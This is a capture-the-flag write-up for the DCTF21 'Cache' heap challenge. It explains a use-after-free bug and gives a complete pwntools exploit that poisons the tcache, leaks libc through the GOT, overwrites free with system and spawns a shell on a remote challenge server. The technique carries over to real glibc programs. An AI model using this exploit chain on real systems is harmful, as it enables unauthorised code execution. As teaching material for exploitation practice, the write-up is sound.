# Cache
Can you catch me?

Attach:\
[vuln](https://api.cyberedu.ro/v1/contest/dctf21/challenge/99c2bc30-89b5-11ec-b32b-6d1377d288a1/download/1993)\
[libc.so.6](https://api.cyberedu.ro/v1/contest/dctf21/challenge/99c2bc30-89b5-11ec-b32b-6d1377d288a1/download/1994)

## Overview
This challenge have a popular structure of a heap challenge with some options which interact to heap:
```
MENU
1: Make new admin
2: Make new user
3: Print admin info
4: Edit Student Name
5: Print Student Name
6: Delete admin
7: Delete user

Choice: 
```
1. Make new admin:\
Create a heap chunk have 0x20 bytes as size. 
```c
ADMIN_DATA = (code **)malloc(0x10);
ADMIN_DATA[1] = admin_info;
*ADMIN_DATA = getFlag;
```
2. Make new user:\
Create a heap chunk have 0x20 bytes to store name from input (`USER_DATA`)
3. Print admin info:\
Call `admin_info()` function via `ADMIN_DATA[1]`
4. Edit Student name:\
Edit the string in `USER_DATA` pointer
5. Print Student name:\
Using `printf()` with `USER_DATA`
6. Delete admin
Free `ADMIN_DATA` pointer
7. Delete user
Free `USER_DATA` pointer

## Bugs
The bug here is UAF at `USER_DATA` because after freeing, `USER_DATA` still are old value and not be set to 0.

## Exploit
We have checksec's result:
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
RUNPATH:  b'./'
```
Because we have `getFlag()` function pointer in `ADMIN_DATA`. First my idea is calling that function.\
Firstly, I malloced a chunk with `USER_DATA` then freed it. After that, I malloced a chunk with `ADMIN_DATA`.
Because 2 structs have same size, `USER_DATA` pointed to `ADMIN_DATA`. I override `admin_info` address with `getFlag` address and triggered it with **Print admin info** feature. But I got this fake result from server :)\
Move to RCE expection. I leaked libc address via GOT table by UAF bug:
- Malloc 2 structs and free it (the `ADMIN_DATA` first)
- Edit next chunk in *tcache* point to GOT
- Leak GOT with **Print user info** feature
- Override GOT with *system* (I chose *free* function because I can control input for it fully)
- Trigger and exec `system("/bin/sh")`

## Code
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
gdb_script='''
init-gef\n
b main\n
b *0x00400a9e\n
b *0x00400a85\n
b *0x0040095e\n
b *0x00400a2f\n
'''

get_flag = exe.symbols["getFlag"]
setbuf = exe.got["setbuf"]
printf = exe.got["printf"]
free = exe.got["free"]
log.info("Free got: " + str(hex(free)))

def conn():
    print(str(args.LOCAL) + " " + str(args.DEBUG))
    if args.LOCAL:
        r = process([exe.path])
    elif args.DB:
        r = process([exe.path])
        gdb.attach(r,gdbscript = gdb_script)
    elif args.REMOTE:
        r = remote("35.246.134.224",30532)

    return r

def new_admin(r):
    r.sendafter(b"Choice: ",b"1\n")
def new_user(r,name):
    r.sendafter(b"Choice: ",b"2\n")
    r.sendafter(b"What is your name: ",name)
def info_admin(r):
    r.sendafter(b"Choice: ",b"3\n")
    return r.recvuntil(b"MENU")
def edit_user(r,name):
    r.sendafter(b"Choice: ",b"4\n")
    r.sendafter(b"What is your name: ",name)
def info_user(r):
    r.sendafter(b"Choice: ",b"5\n")
    r.recvuntil(b"Students name is ")
    return r.recvuntil(b"\n")

def del_admin(r):
    r.sendafter(b"Choice: ",b"6\n")
def del_user(r):
    r.sendafter(b"Choice: ",b"7\n")

def main():
    r = conn()

    # Leak address heap chunk
    new_admin(r)
    new_user(r,b"123")
    del_admin(r)
    del_user(r)
    res = info_user(r)[:-1]
    res = res.ljust(8,b"\x00")
    res = u64(res)
    
    admin_chunk = res
    user_chunk = admin_chunk + 0x20

    log.info("Chunk: " + str(hex(admin_chunk)))
    
    log.info("LEAK DONE")

    # malloc user_chunk -> GOT:
    log.info("Edit Tcache chunk to GOT")
    edit_user(r,p64(free-0x8))
    log.info("Malloc user_chunk to GOT")
    new_admin(r)
    new_user(r,b"A"*8)

    # Leak libc:
    log.info("Get setbuf libc addr")
    res = info_user(r)[8:-1]
    res = res.ljust(8,b"\x00")
    res = u64(res)
    base_libc = res - libc.symbols["free"] 
    libc.address = base_libc
    system = libc.symbols["system"]
    log.info("System libc: " + str(hex(system)))
     
    # Edit for creating system("/bin/sh")
    log.info("Edit user_chunk with: | \"/bin/sh\" | system |")
    edit_user(r, b"/bin/sh\x00"+p64(system))
    
    # Trigger shell
    del_user(r)


    r.interactive()


if __name__ == "__main__":
    main()
```
